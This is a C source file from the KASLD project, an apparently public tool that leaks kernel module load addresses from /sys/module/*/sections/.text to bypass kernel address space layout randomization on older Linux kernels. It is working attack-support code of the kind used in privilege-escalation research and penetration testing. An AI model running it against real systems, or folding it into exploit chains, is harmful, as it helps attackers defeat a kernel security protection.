// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Retrieve virtual address for loadable kernel modules from
// /sys/module/*/sections/.text
//
// Kernel module section offsets were exposed world-readable in SysFS from 2004.
// Permissions were modified to prevent access (unless `kptr_restrict = 0`) in
// kernel 4.15-rc1 on 2017-11-12:
// https://github.com/torvalds/linux/commit/277642dcca765a1955d4c753a5a315ff7f2eb09d
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "kasld.h"
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned long read_module_text(char *path) {
  FILE *f;
  char *endptr;
  unsigned int buff_len = 64;
  char buff[buff_len];
  const int addr_len = sizeof(long*) * 2;
  unsigned long addr = 0;

  // printf("[.] checking %s ...\n", path);

  f = fopen(path, "rb");
  if (f == NULL) {
    // printf("[-] open/read(%s): %m\n", path);
    return 0;
  }

  if (fgets(buff, buff_len, f) == NULL) {
    // printf("[-] fgets(%s): %m\n", path);
    fclose(f);
    return 0;
  }

  fclose(f);

  // pointer hex string length + "0x" prefix + "\n" line feed
  if (strlen(buff) != addr_len + 3)
    return 0;

  addr = strtoul(buff, &endptr, 16);

  // modules may be mapped below kernel text for some architectures
  // (arm32/riscv64/ppc32/...)
  if (addr && addr <= KERNEL_VAS_END)
    return addr;

  return 0;
}

unsigned long get_module_text_sysfs() {
  char d_path[1024];
  unsigned long addr = 0;
  unsigned long text_addr = 0;
  const char *path = "/sys/module/";
  struct dirent *dir;
  DIR *d;

  printf("[.] trying /sys/modules/*/sections/.text ...\n");

  d = opendir(path);
  if (d == NULL) {
    printf("opendir(%s): %m\n", path);
    return 0;
  }

  while ((dir = readdir(d)) != NULL) {
    if (dir->d_type != DT_DIR)
      continue;

    snprintf(d_path, sizeof(d_path), "%s%s/sections/.text", path, dir->d_name);
    text_addr = read_module_text(d_path);

    if (!text_addr)
      continue;

    if (!addr || text_addr < addr)
      addr = text_addr;
  }

  closedir(d);

  return addr;
}

int main(int argc, char **argv) {
  unsigned long addr = get_module_text_sysfs();
  if (!addr)
    return 1;

  printf("lowest leaked module text address: %lx\n", addr);

  if (addr < MODULES_START || addr > MODULES_END)
    printf("[!] warning: module located outside of defined MODULES_START and MODULES_END range (%lx - %lx)\n", MODULES_START, MODULES_END);

  return 0;
}
